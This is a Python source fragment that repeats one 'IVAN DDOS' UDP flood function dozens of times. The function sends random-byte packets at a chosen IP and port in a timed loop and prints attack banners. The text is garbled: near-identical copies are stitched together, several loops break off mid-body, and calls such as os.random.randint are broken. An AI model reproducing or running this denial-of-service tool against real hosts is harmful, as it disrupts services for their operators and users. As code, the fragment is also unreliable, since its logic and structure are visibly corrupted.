        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
